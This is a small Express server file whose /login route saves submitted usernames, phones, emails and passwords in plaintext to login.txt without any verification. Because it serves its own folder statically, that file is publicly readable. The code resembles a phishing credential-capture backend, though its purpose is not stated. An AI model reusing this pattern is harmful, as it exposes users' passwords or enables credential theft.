// filepath: c:\Users\user\OneDrive\Desktop\DETECTOR PROJECT\server.js
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();
const PORT = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname)); // Serve static files

app.post('/login', (req, res) => {
  const { username, phone, email, password } = req.body;
  const entry = `Username: ${username}, Phone: ${phone}, Email: ${email}, Password: ${password}\n`;
  fs.appendFileSync('login.txt', entry); // Make sure this is 'login.txt'
  res.send('Login information saved!');
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});

